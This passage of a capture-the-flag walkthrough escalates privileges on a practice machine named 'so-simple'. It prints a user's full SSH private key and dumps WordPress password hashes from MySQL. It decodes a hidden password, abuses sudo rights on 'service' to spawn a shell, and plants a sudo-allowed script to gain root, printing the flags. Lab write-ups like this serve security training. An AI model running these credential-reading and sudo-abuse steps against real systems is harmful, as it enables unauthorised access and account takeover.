As "www-data":
```bash
ls -la /home

# drwxr-xr-x  7 max    max    4096 Aug 22  2020 max
# drwxr-xr-x  3 steven steven 4096 Aug 22  2020 steven
```

Max has a .ssh folder with a private key:
```bash
cat /home/max/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

SSH as max:
```bash
# Copy private key into file: max.id_rsa
chmod 700 max.id_rsa
ssh max@192.168.131.78 -i max.id_rsa
```
Voilá!

# MAX

The max user.txt is not the correct one:
```bash 
cat user.txt 
# This is not the flag you're looking for...
```

The user "steven" also has a "user2.txt" file which might be the correct one:
```bash
ls -l /home/steven/
# total 4
# -rwxr-x--- 1 steven steven 42 Aug 22  2020 user2.txt
```

Max local.txt and personal.txt:
```bash
cat local.txt 
# d74461fda53f36a1f55c131773c57dad

cat personal.txt | base64 -d -w0
# Hahahahaha, it's not that easy !!! 
```

OS:
```bash
uname -a
# Linux so-simple 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Search for credentials in files:
```bash
# Use this to exclude nested directories (like /var/cache)
find / \
! -readable -prune -o \
-path /usr -prune -o \
-path /lib -prune -o \
-path /boot -prune -o \
-path /bin -prune -o \
-path /cache -prune -o \
-path /snap -prune -o \
-path /proc -prune -o \
-path /var/www/html/wordpress -prune -o \
-path /var/cache -prune -o \
-path /var/lib -prune -o \
-path /run -prune -o \
-path /etc/ssl/certs -prune -o \
-path /etc/grub.d -prune -o \
-type f -print 2>/dev/null | xargs grep -iIe "STEVEN" --color=always
```

MySQL:
```bash
mysql -h 127.0.0.1 -u wp_user -p
# password
```

```
MariaDB [wordpress]> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BqOIi8a7Jtcidgsi9y9WXw9UIfqD4q1 |
| max        | $P$BfDfIwyVLEQAVBrDn/ox9qT6uzgwwZ1 |
+------------+------------------------------------+
```

Backup file?
```bash
cat /var/www/html/mybackup.txt 
# JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF
```
Its base32 encoded:
```bash
echo "JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF" | base32 -d            

# I have to keep this password somewhere safely because I can't remember it: opensesame
```

Sudo privs:
```bash
sudo -l

# User max may run the following commands on so-simple:
#     (steven) NOPASSWD: /usr/sbin/service
```
=> Max can run a binary as steven!
Get a shell as steven:
```bash
sudo -u steven /usr/sbin/service ../../bin/sh
```

# STEVEN

Sudo privs:
```bash
sudo -l
# Matching Defaults entries for steven on so-simple:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

# User steven may run the following commands on so-simple:
#     (root) NOPASSWD: /opt/tools/server-health.sh
```

The folder /opt/tools and the  script do not exist:
```bash
/opt/tools/server-health.sh
# /etc/init.d/../../bin/sh: 8: /opt/tools/server-health.sh: not found

ls -l /opt
# total 0

# Steven is the owner of /opt and thus we can just create the file
ls -l / | grep opt
# drwxr-xr-x   2 steven steven       4096 Sep  3  2020 opt
```

Create script:
```bash
mkdir /opt/tools
echo "#!/bin/bash" > /opt/tools/server-health.sh
echo "exec \$SHELL" >> /opt/tools/server-health.sh
cat /opt/tools/server-health.sh
#!/bin/bash
# exec $SHELL
chmod +x /opt/tools/server-health.sh
sudo /opt/tools/server-health.sh
# root@so-simple:/home/steven# whoami
# root
```
BINGO!

```bash
cat /root/proof.txt
# 7674e8ad75a71aa9c87e7dea4527d5d9
```